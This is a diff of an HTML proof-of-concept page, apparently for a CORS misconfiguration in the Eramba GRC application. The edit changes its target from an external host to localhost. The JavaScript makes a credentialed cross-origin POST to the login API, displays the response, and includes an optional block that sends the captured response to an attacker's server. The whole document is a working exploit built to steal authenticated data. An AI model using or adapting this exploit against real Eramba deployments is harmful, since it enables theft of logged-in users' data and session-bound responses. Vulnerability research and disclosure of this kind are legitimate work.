@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Eramba CORS PoC (XHR Style)</title>
+  <title>Eramba local CORS PoC (XHR Style)</title>
 </head>
 <body>
   <h2>Eramba CORS Exploit Demo (XHR)</h2>
@@ -11,7 +11,7 @@
     function exploit() {
       var req = new XMLHttpRequest();
       req.onload = function() {
-        alert("Response from grc.global.com:\n\n" + this.responseText);
+        alert("Response from localhost:\n\n" + this.responseText);
 
         // Optional: Exfiltrate to your server
         var exfil = new XMLHttpRequest();
@@ -20,7 +20,7 @@
         exfil.send(JSON.stringify({ response: this.responseText }));
       };
 
-      req.open("POST", "https://grc.global.com/system-api/login", true);
+      req.open("POST", "https://localhost:8443/system-api/login", true);
       req.withCredentials = true;
       req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
       req.send("login=asdf&password=asdf");
